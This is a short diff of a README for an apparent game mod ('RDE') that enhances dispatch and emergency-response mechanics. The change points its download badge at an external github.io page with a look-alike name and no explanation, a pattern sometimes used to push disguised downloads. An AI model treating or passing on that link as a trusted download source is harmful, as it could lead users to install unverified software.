@@ -8,7 +8,7 @@ With RDE, the **dispatch system, AI behavior, and emergency response mechanics**
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://realism-dispatch-enhancer-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install **ScriptHookV** and **OpenIV**.  
